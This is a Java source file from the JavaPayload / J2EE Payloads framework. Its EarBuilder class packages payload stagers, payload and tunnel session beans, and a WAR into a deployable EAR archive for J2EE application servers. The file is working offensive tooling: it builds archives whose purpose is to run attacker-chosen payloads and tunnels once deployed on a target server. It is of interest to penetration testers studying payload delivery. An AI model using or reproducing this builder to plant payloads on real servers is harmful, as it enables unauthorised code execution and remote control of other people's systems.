/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.builder;

import j2eepayload.ejb.JavaPayload;
import j2eepayload.ejb.JavaPayloadBean;
import j2eepayload.ejb.JavaPayloadHome;
import j2eepayload.ejb.JavaPayloadSession;
import j2eepayload.ejb.JavaPayloadTunnel;
import j2eepayload.ejb.JavaPayloadTunnelBean;
import j2eepayload.ejb.JavaPayloadTunnelHome;
import j2eepayload.ejb.JavaPayloadTunnelSession;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;

import javapayload.builder.Builder;
import javapayload.builder.JarBuilder;
import javapayload.handler.stager.WrappedPipedOutputStream;
import javapayload.loader.DynLoader;
import javapayload.stager.LocalTest;
import javapayload.stager.Stager;

public class EarBuilder extends Builder {
	
	public static void main(String[] args) throws Exception {
		if (args.length < 2 || args[0].indexOf("!") != -1 || "!EJB!WAR!Both!".indexOf('!'+args[0]+'!') == -1) {
			System.out.println("Usage: java j2eepayload.builder.EarBuilder EJB|WAR|Both [--strip] [<filename>.ear] <stager> [<moreStagers...>]");
			return;
		}
		new EarBuilder().build(args);
	}
	
	public EarBuilder() {
		super("Build an EAR file.", "");
	}
	
	public String getParameterSyntax() {
		return "EJB|WAR|Both [--strip] [<filename>.ear] <stager> [<moreStagers...>]";
	}
	
	public void build(String[] args) throws Exception {
		boolean ejb = args[0].equals("EJB") || args[0].equals("Both");
		boolean war = args[0].equals("WAR") || args[0].equals("Both");
		byte[] ejbJar = null;
		String overrideName = null;
		if (ejb) {
			boolean stripDebugInfo = false;
			boolean useTunnel = false, usePayload = false;
			List classes = new ArrayList();
			for (int i = 1; i < args.length; i++) {
				if (args[i].startsWith("Servlet") && war)
					continue;
				if (args[i].equals("--") && war)
					break;
				if (args[i].equals("--strip")) {
					stripDebugInfo = true;
				} else if (args[i].endsWith(".ear")) {
					overrideName = args[i];
				} else if (args[i].equals("EJBTunnel")) {
					useTunnel = true;
					classes.add(JavaPayloadTunnel.class);
					classes.add(JavaPayloadTunnelSession.class);
					classes.add(JavaPayloadTunnelHome.class);
					classes.add(JavaPayloadTunnelBean.class);
					classes.add(JavaPayloadTunnelBean.PayloadRunner.class);
					classes.add(WrappedPipedOutputStream.class);
					classes.add(LocalTest.class);
				} else {
					classes.add(DynLoader.loadStager(args[i], null, 0));
					if (!usePayload) {
						usePayload = true;
						classes.add(JavaPayload.class);
						classes.add(JavaPayloadSession.class);
						classes.add(JavaPayloadHome.class);
						classes.add(JavaPayloadBean.class);
						classes.add(JavaPayloadBean.PayloadRunner.class);
					}
				}
			}
			if (useTunnel || usePayload) 
				classes.add(Stager.class);
			String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + 
					"<!DOCTYPE ejb-jar PUBLIC \"-//Sun Microsystems, Inc.//DTD Enterprise JavaBeans 1.1//EN\" \"http://java.sun.com/j2ee/dtds/ejb-jar_1_1.dtd\">\r\n" + 
					"<ejb-jar>\r\n" + 
					"   <enterprise-beans>\r\n";
			if (useTunnel)
				xml += getSessionBeanEntry("JavaPayloadTunnel", JavaPayloadTunnelHome.class, JavaPayloadTunnel.class, JavaPayloadTunnelSession.class, true);
			if (usePayload)
				xml += getSessionBeanEntry("JavaPayload", JavaPayloadHome.class, JavaPayload.class, JavaPayloadSession.class, false);
			xml += "   </enterprise-beans>\r\n" + 
					"</ejb-jar>\r\n";
			ejbJar = buildEjbJar((Class[]) classes.toArray(new Class[classes.size()]), xml, stripDebugInfo);
		}
		if (war) {
			List warArgs = new ArrayList();
			warArgs.add("~tmp.war");
			for (int i = 1; i < args.length; i++) {
				if (ejb && args[i].equals("EJBTunnel"))
					continue;
				if (args[i].endsWith(".ear")) {
					overrideName = args[i];
				} else if (args[i].equals("--")) {
					for (int j = i; j < args.length; j++) {
						warArgs.add(args[j]);
					}
					break;
				}
				warArgs.add(args[i]);
			}
			WarBuilder.main((String[]) warArgs.toArray(new String[warArgs.size()]));
		}
		StringBuffer earName = new StringBuffer(args[0]); 
		for (int i = 1; i < args.length; i++) {
			if (args[i].equals("--"))
				break;
			earName.append('_').append(args[i].equals("--strip") ? "stripped" : args[i]);
		}
		final Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Main-Class", "javapayload.loader.StandaloneLoader");
		buildEar(overrideName != null ? overrideName : earName.append(".ear").toString(), ejbJar, "~tmp.war");
	}

	private static String getSessionBeanEntry(String name, Class home, Class remote, Class session, boolean stateful) {
		return "      <session>\r\n" + 
			"         <ejb-name>" + name + "</ejb-name>\r\n" + 
			"         <home>" + home.getName() + "</home>\r\n" + 
			"         <remote>" + remote.getName() + "</remote>\r\n" + 
			"         <ejb-class>" + session.getName() + "</ejb-class>\r\n" + 
			"         <session-type>" + (stateful ? "Stateful" : "Stateless") + "</session-type>\r\n" + 
			"         <transaction-type>Container</transaction-type>\r\n" + 
			"      </session>\r\n";
	}

	protected static byte[] buildEjbJar(Class[] classes, String xml, boolean stripDebugInfo) throws Exception {
		Manifest manifest = new Manifest();
		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		final JarOutputStream jos = new JarOutputStream(baos, manifest);
		JarBuilder.addClasses(jos, "", classes, stripDebugInfo);
		jos.putNextEntry(new ZipEntry("META-INF/ejb-jar.xml"));
		jos.write(xml.getBytes("UTF-8"));
		jos.close();
		return baos.toByteArray();
	}

	protected static void buildEar(String fileName, byte[] ejbJar, String warFileName) throws Exception {
		Manifest manifest = new Manifest();
		String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + 
				"<!DOCTYPE application PUBLIC \"-//Sun Microsystems, Inc.//DTD J2EE Application 1.2//EN\" \"http://java.sun.com/j2ee/dtds/application_1_2.dtd\">\r\n" + 
				"<application>\r\n" + 
				"	<display-name>JP</display-name>\r\n";
		if (ejbJar != null)
			xml += "	<module>\r\n" + 
				"		<ejb>JP.jar</ejb>\r\n" + 
				"	</module>\r\n";
		if (warFileName != null)
			xml += "	<module>\r\n" + 
				"		<web>\r\n" + 
				"			<web-uri>JP.war</web-uri>\r\n" + 
				"			<context-root>JP</context-root>\r\n" + 
				"		</web>\r\n" + 
				"	</module>";
		xml += 
				"</application>\r\n";
		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
		final JarOutputStream jos = new JarOutputStream(new FileOutputStream(fileName), manifest);
		if (ejbJar != null) {
			jos.putNextEntry(new ZipEntry("JP.jar"));
			jos.write(ejbJar);
		}
		if (warFileName != null) {
			jos.putNextEntry(new ZipEntry("JP.war"));
			final byte[] buf = new byte[4096];
			int len;
			FileInputStream in = new FileInputStream(warFileName);
			while ((len = in.read(buf)) != -1) {
				jos.write(buf, 0, len);
			}
			in.close();
		}
		jos.putNextEntry(new ZipEntry("META-INF/application.xml"));
		jos.write(xml.getBytes("UTF-8"));
		jos.close();
	}
}
